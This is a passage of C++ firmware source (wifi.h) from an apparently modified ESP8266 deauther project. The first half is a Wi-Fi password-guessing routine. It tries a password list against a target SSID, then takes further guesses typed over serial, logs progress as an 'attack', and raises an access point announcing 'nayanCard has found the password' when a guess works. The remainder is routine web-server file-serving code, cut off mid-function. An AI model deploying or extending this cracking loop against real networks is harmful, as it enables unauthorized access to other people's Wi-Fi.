NikolaTesla17/myNewTestIntegration/aaaaaaaaaaaaaaaaaaaaaNowNewFolder/esp8266_deauther-2/esp8266_deauther/wifi.h
  while ((WiFi.status() != WL_CONNECTED) && !failed) 
  {
    
  static char buffer[MAX_MESSAGE];
  static unsigned char index = 0;
  char currentChar;

      while(itNum<passwordsSize){
      passwordME = passwords[itNum];
      String outputProgress = "";


      outputProgress += "You are currently testing the network ";
      outputProgress += ssidME;
      outputProgress += " with the password ";
      outputProgress += passwordME;
      outputProgress += " which is number ";
      outputProgress += itNum+1;
      outputProgress += " out of ";
      outputProgress += passwordsSize;
      outputProgress += ".";
      outputProgress += " About";
      outputProgress += seconds;
      outputProgress += " seconds have elapsed since the start of this attack";
      Serial.println(outputProgress);
      itNum++;
      
      WiFi.begin(ssidME, passwordME);
      delay(21850);
      seconds += 22;
      }

while(seconds < 3000){
    while(Serial.available() > 0) {//try serical.avalible as a bool
      currentChar = Serial.read();
      if (currentChar == '\n'){

      Serial.print("You entered: "); //you entered "what you entered"
      Serial.print(buffer);
      Serial.print('\n');
      passwordME = buffer;

      Serial.print("trying password number "); //trying password number "number": "password"           seconds elapsed: "seconds"
      Serial.print((itNum+1));
      Serial.print(": ");
      Serial.print(passwordME);
      Serial.print('\n');
      Serial.print("seconds elapsed:");
      Serial.print(seconds);
      Serial.print('\n');
      Serial.print('\n');
      itNum++;
      
      WiFi.begin(ssidME, passwordME);
      delay(21850);
      seconds += 22;

      Serial.println("please enter a password to try");
      Serial.print('\n');

      buffer[0] = 0;
      index = 0;
     } else {       
      if (index < MAX_MESSAGE-1) {
        buffer[index++] = currentChar;
        buffer[index] = 0;
       }  
      } 
     }
     }
     Serial.println("this failed");
     failed = true;
    }

    if(!failed)
    {
    Serial.print("WiFi connection Successful, taking about ");//Wifi connection succesful, taking about "seconds"     The Ip address of this module is "ip"    The wifi password for "network" is "password"
    Serial.print(seconds);
    Serial.print(" seconds");
    Serial.print('\n');
    Serial.print("Information:");
    Serial.print('\n');
    WiFi.printDiag(Serial);

    String correctPassword = passwordME;
    WiFi.softAP("nayanCard has found the password", NULL);             // Start the access point

    passwordSuccess = "";
    passwordSuccess += "The password for the wifi network ";
    passwordSuccess += ssidME;
    passwordSuccess += " Is";
    passwordSuccess += passwordME;
    }


     if(failed){
      WiFi.softAP("nayanCard failed to find the password", NULL);             // Start the access point
     }

  //}
  //String before = ssidME;
  //server.send(200, "text/html", dictionaryHtmlOne+before+dictionaryHtmlTwo);
}


void stopAP() {
    if (wifiMode == WIFI_MODE_AP) {
        wifi_promiscuous_enable(0);
        WiFi.persistent(false);
        WiFi.disconnect(true);
        wifi_set_opmode(STATION_MODE);
        prntln(W_STOPPED_AP);
        wifiMode = WIFI_MODE_STATION;
    }
}

void wifiUpdate() {
    if ((wifiMode != WIFI_MODE_OFF) && !scan.isScanning()) {
        server.handleClient();
        dnsServer.processNextRequest();
    }
}

String getWifiMode() {
    switch (wifiMode) {
        case WIFI_MODE_OFF:
            return W_MODE_OFF;

            break;

        case WIFI_MODE_AP:
            return W_MODE_AP;

            break;

        case WIFI_MODE_STATION:
            return W_MODE_ST;

            break;

        default:
            return String();
    }
}

String getContentType(String filename) {
    if (server.hasArg("download")) return String(F("application/octet-stream"));
    else if (filename.endsWith(str(W_DOT_GZIP))) filename = filename.substring(0, filename.length() - 3);
    else if (filename.endsWith(str(W_DOT_HTM))) return str(W_HTML);
    else if (filename.endsWith(str(W_DOT_HTML))) return str(W_HTML);
    else if (filename.endsWith(str(W_DOT_CSS))) return str(W_CSS);
    else if (filename.endsWith(str(W_DOT_JS))) return str(W_JS);
    else if (filename.endsWith(str(W_DOT_PNG))) return str(W_PNG);
    else if (filename.endsWith(str(W_DOT_GIF))) return str(W_GIF);
    else if (filename.endsWith(str(W_DOT_JPG))) return str(W_JPG);
    else if (filename.endsWith(str(W_DOT_ICON))) return str(W_ICON);
    else if (filename.endsWith(str(W_DOT_XML))) return str(W_XML);
    else if (filename.endsWith(str(W_DOT_PDF))) return str(W_XPDF);
    else if (filename.endsWith(str(W_DOT_ZIP))) return str(W_XZIP);
    else if (filename.endsWith(str(W_DOT_JSON))) return str(W_JSON);
    else return str(W_TXT);
}

bool handleFileRead(String path) {
    // prnt(W_AP_REQUEST);
    // prnt(path);

    if (!path.charAt(0) == SLASH) path = String(SLASH) + path;

    if (path.charAt(path.length() - 1) == SLASH) path += String(F("index.html"));

    String contentType = getContentType(path);

    if (!SPIFFS.exists(path)) {
        if (SPIFFS.exists(path + str(W_DOT_GZIP))) path += str(W_DOT_GZIP);
        else if (SPIFFS.exists(wifi_config_path + path)) path = wifi_config_path + path;
        else if (SPIFFS.exists(wifi_config_path + path + str(W_DOT_GZIP))) path = wifi_config_path + path + str(
                W_DOT_GZIP);
        else {
            // prntln(W_NOT_FOUND);
            return false;
        }
    }

    File file = SPIFFS.open(path, "r");
    server.streamFile(file, contentType);
    file.close();
    // prnt(SPACE);
    // prntln(W_OK);

    return true;
}

void handleFileList() {
    if (!server.hasArg("dir")) {
        server.send(500, str(W_TXT), str(W_BAD_ARGS));
        return;
    }

    String path = server.arg("dir");
    // Serial.println("handleFileList: " + path);
    Dir dir = SPIFFS.openDir(path);

    String output = String(OPEN_BRACKET); // {
    File   entry;
    bool   first = true;

    while (dir.next()) {
        entry = dir.openFile("r");

        if (first) first = false;
        else output += COMMA;                                                 // ,

        output += OPEN_BRACKET;                                               // [
        output += String(DOUBLEQUOTES) + entry.name() + String(DOUBLEQUOTES); // "filename"
        output += CLOSE_BRACKET;                                              // ]

